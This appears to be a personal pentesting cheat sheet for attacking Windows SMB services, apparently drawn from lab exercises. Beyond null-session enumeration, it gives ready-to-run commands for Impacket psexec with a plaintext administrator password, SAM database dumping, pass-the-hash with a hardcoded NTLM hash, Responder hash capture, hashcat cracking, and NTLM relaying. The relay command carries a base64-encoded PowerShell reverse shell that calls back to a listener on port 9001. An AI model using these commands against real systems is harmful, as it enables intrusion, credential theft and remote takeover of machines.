Null sessions are unauthenticated connections to an SMB server, similar to anonymous connections in FTP. These can be used to enumerate information about the server without providing credentials.

Nmap Scan for SMB Services
```
sudo nmap 10.129.141.128 -sV -sC -p139,445
```

Null Session Connection with smbclient
```
smbclient -N -L \\\\10.129.42.253
smbclient -N -L //10.129.14.128

smbclient -U jason //10.129.51.180/GGJ
dir
get filename
```

Viewing Permissions with smbmap
```
smbmap -H 10.129.14.128
```

Recursive Search with smbmap
```
smbmap -H 10.129.14.128 -r notes
```

Download a File with smbmap
```
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

Upload a File with smbmap
```
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

Connect to a Share with smbclient
```
smbclient \\\\10.129.191.141\sambashare
```

SMB OS Discovery with nmap
```
nmap --script smb-os-discovery.nse -p445 10.10.10.40
```

Null Session with rpcclient
```
rpcclient -U'%' 10.129.14.128
```
Enumerate Domain Users
```
enumdomusers
```

```
RPC Commands
srvinfo: Server information.
enumdomains: Enumerate all domains.
querydominfo: Domain, server, and user information.
netshareenumall: Enumerate all shares.
netsharegetinfo <share>: Information about a specific share.
enumdomusers: Enumerate all domain users.
queryuser <RID>: Information about a specific user.
```

CrackMapExec Commands
Listing Shares
```
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```
Using Username Lists
```
crackmapexec smb 10.129.51.180 -u jason -p  --local-auth
```

Running Enum4linux-ng
```
./enum4linux-ng.py 10.129.14.128 -A -C
```

Advanced SMB Exploitation with Impacket and CrackMapExec
Impacket PsExec
```
impacket-psexec administrator:'Password123!'@10.10.110.17
```
Impacket SMBExec

A variant of PsExec without using RemComSvc, useful when no writable share is available.
Impacket atexec

Executes a command via Task Scheduler service.
CrackMapExec Implementation of smbexec and atexec


```
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

```
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
Attacking SAM Database with CrackMapExec
```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
PTH!!
```
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

Capture NTLM hashes
```
responder -I <interface name>
```
Hashes saved here /usr/share/responder/logs/

Crack NTLM hashes
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Collect SAM database turn off SMB in responder.conf
```
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

https://www.revshells.com/        option Powershell #3 (Base64)
powershell reverse shell
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Ensure NC -LVNP 9001



Metasploit PsExec

A Ruby implementation of PsExec.